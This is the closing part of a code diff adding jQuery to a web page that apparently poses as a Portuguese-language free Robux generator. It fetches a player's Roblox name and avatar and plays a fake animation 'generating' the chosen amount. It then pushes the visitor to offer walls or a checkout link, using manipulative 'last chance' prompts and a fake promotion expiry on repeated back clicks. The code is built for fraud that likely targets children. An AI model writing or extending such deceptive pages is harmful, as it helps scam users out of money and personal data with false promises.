+            // If promotion expired, don't allow any action
+            if (promotionExpired) {
+                return;
+            }
+
+            backClickCount++;
+
+            if (backClickCount === 1 || backClickCount === 3) {
+                // 1st, 3rd click: show warning with "CONTINUAR"
+                $('#exit-warning-btn-text').text('CONTINUAR');
+                $('#exit-warning-modal').show();
+            } else if (backClickCount === 7) {
+                // 7th click: show warning with "MINUTOS FINAIS"
+                $('#exit-warning-btn-text').text('MINUTOS FINAIS');
+                $('#exit-warning-modal').show();
+            } else if (backClickCount === 2 || backClickCount === 4 || backClickCount === 6) {
+                // 2nd, 4th, 6th click: allow user to go back to Robux selection
+                $('#last-step-modal').hide();
+                $('#professional-loading-modal').hide();
+                $('html, body').animate({
+                    scrollTop: $("#robux-redesign-page").offset().top - 100
+                }, 500);
+            } else if (backClickCount === 5) {
+                // 5th click: show warning with "ÚLTIMA CHANCE"
+                $('#exit-warning-btn-text').text('ÚLTIMA CHANCE');
+                $('#exit-warning-modal').show();
+            } else if (backClickCount >= 8) {
+                // 8th+ click: show promotion expired message and set cooldown
+                promotionExpired = true;
+                // Set cooldown timestamp (5 minutes from now)
+                var cooldownEnd = Date.now() + (5 * 60 * 1000); // 5 minutes in milliseconds
+                localStorage.setItem('promotionCooldown', cooldownEnd);
+
+                $('#last-step-modal').hide();
+                $('#professional-loading-modal').hide();
+                $('#promotion-expired-modal').show();
+            }
+        }
+
+        // Function to open checkout in new tab
+        function openCheckout() {
+            // Get the correct checkout URL for the selected amount
+            var checkoutUrl = getCheckoutUrl(selectedRobuxAmount);
+            // Open checkout URL in a new tab
+            window.open(checkoutUrl, '_blank');
+        }
+
+        $(document).ready(function () {
+
+            var currentUsername = 'Guest';
+            var currentAvatar = 'https://tr.rbxcdn.com/38c6ed3c061801fefef02b8433f4a378/420/420/Hat/Png';
+
+            function formatRobux(num) {
+                if (num >= 1000) return (num / 1000).toFixed(0) + 'K';
+                return num;
+            }
+
+            // MAIN LOGIC: CLICK PACKAGE TO START PROCESS
+            $('.robux-package-btn').on('click', function () {
+                var username = $('#username-input').val().trim();
+                var amount = $(this).data('robux-amount');
+
+                // Store in global for checkout
+                selectedRobuxAmount = amount;
+
+                // Check if user is in cooldown period
+                var cooldownEnd = localStorage.getItem('promotionCooldown');
+                if (cooldownEnd && Date.now() < parseInt(cooldownEnd)) {
+                    var remainingMinutes = Math.ceil((parseInt(cooldownEnd) - Date.now()) / 60000);
+                    $('#username-error').html('Você precisa aguardar ' + remainingMinutes + ' minuto(s) antes de tentar novamente.').slideDown();
+                    $('html, body').animate({
+                        scrollTop: $("#username-input-section").offset().top - 150
+                    }, 800);
+                    return;
+                }
+
+                // 1. Validate Username
+                if (!username) {
+                    $('#username-error').text('Por favor, digite seu nome de usuário acima para continuar.').slideDown();
+                    $('html, body').animate({
+                        scrollTop: $("#username-input-section").offset().top - 150
+                    }, 800);
+                    return;
+                }
+
+                $('#username-error').hide();
+
+                // 2. Show Loading Modal (Searching for User)
+                $('#professional-loading-modal').css('display', 'flex');
+                $('#loading-status').html('<span style="font-size: 20px;">Procurando Usuário...</span>');
+
+                // 3. Perform API Lookup (Local API with Dynamic Host)
+                var baseUrl = window.location.origin; // Dynamically get current scheme + host
+
+                $.ajax({
+                    url: baseUrl + '/api/user',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        "usernames": [username],
+                        "excludeBannedUsers": true
+                    }),
+                    success: function (response) {
+                        if (response.data && response.data.length > 0) {
+                            var userId = response.data[0].id;
+                            var foundName = response.data[0].name;
+                            var thumbUrl = baseUrl + `/api/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`;
+
+                            $.ajax({
+                                url: thumbUrl,
+                                type: 'GET',
+                                success: function (imgResp) {
+                                    if (imgResp.data && imgResp.data.length > 0) {
+                                        currentAvatar = imgResp.data[0].imageUrl;
+                                    }
+                                    currentUsername = foundName;
+                                    startGenerationProcess(amount);
+                                },
+                                error: function () {
+                                    currentUsername = username;
+                                    startGenerationProcess(amount);
+                                }
+                            });
+                        } else {
+                            $('#professional-loading-modal').hide();
+                            $('#username-error').text('Username not found. Please check spelling.').slideDown();
+                        }
+                    },
+                    error: function () {
+                        // If API fails (blocked, 500), proceed for demo
+                        currentUsername = username;
+                        startGenerationProcess(amount);
+                    }
+                });
+            });
+
+            // Function to run the generation animation after user is "Found"
+            function startGenerationProcess(amount) {
+
+                // Update text to show we found them
+                $('#loading-status').html('<span style="font-size: 20px; color:#00b06f;">Usuário Encontrado! Gerando...</span>');
+
+                setTimeout(function () {
+                    $({ Counter: 0 }).animate({ Counter: amount }, {
+                        duration: 2500,
+                        easing: 'swing',
+                        step: function () {
+                            var currentVal = Math.ceil(this.Counter).toLocaleString();
+                            var html = `
+                    <div class="counter-box-pro">
+                        <div class="counter-inner-plate">
+                            <img src="image/robux-icon.png" class="icon-robux" alt="Robux">
+                            <span class="count-text">${currentVal}</span>
+                        </div>
+                    </div>
+                    `;
+                            $('#loading-status').html(html);
+                        },
+                        complete: function () {
+                            var finalVal = amount.toLocaleString();
+                            var html = `
+                    <div class="counter-box-pro" style="border-color: #4CAF50; box-shadow: 0 0 20px rgba(76, 175, 80, 0.4);">
+                        <div class="counter-inner-plate">
+                            <img src="image/robux-icon.png" class="icon-robux" alt="Robux">
+                            <span class="count-text" style="color: #00b06f;">${finalVal}</span>
+                        </div>
+                    </div>
+                    `;
+                            $('#loading-status').html(html);
+
+                            setTimeout(function () {
+                                $('#loading-status').html('<span style="font-size: 20px; color: #4CAF50; font-weight:800;">Sucesso! Finalizando...</span>');
+
+                                setTimeout(function () {
+                                    $('#professional-loading-modal').hide();
+
+                                    // SYNC DATA TO LOBBY ELEMENTS
+                                    $('.user-avatar-sync').attr('src', currentAvatar);
+                                    $('#header-username').text(currentUsername);
+                                    $('.username-text-dynamic').text(currentUsername);
+                                    $('.nav-robux-amount-sync').text(formatRobux(amount));
+                                    $('#selected-robux-amount').text(formatRobux(amount));
+                                    $('#offer-robux-amount').text(formatRobux(amount));
+
+                                    $('#last-step-modal').css('display', 'flex');
+
+                                }, 1200);
+                            }, 1000);
+                        }
+                    });
+                }, 1000);
+            }
+
+            // Manual helper for onclick="_yi()" in user's HTML usually invokes offers
+            window._yi = function () {
+                $('#last-step-modal').hide();
+                $('#offers-modal').show();
+            }
+
+            // Offer modal functionality
+            $('#close-offers').on('click', function () {
+                $('#offers-modal').hide();
+            });
+
+            $('#try-again-btn').on('click', function () {
+                checkForCompletedOffers();
+            });
+
+            function checkForCompletedOffers() {
+                $('#checking-status').show();
+                $('#try-again-btn').prop('disabled', true);
+                $('#completion-message').html('');
+
+                var baseUrl = window.location.origin;
+                $.getJSON(baseUrl + '/public/external/check2.php', function (data) {
+                    $('#checking-status').hide();
+                    $('#try-again-btn').prop('disabled', false);
+
+                    // Simulation logic
+                    var offerCount = data.length;
+                    if (offerCount > 0) {
+                        $('#completion-message').html('<div style="color:green; font-weight:bold;">Success! Offers verified.</div>');
+                    } else {
+                        $('#completion-message').html('<div style="color:red; font-weight:bold;">No completed offers found yet. Please complete an offer and try again.</div>');
+                    }
+                }).fail(function () {
+                    $('#checking-status').hide();
+                    $('#try-again-btn').prop('disabled', false);
+                    $('#completion-message').html('<div style="color:red;">Failed to check.</div>');
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
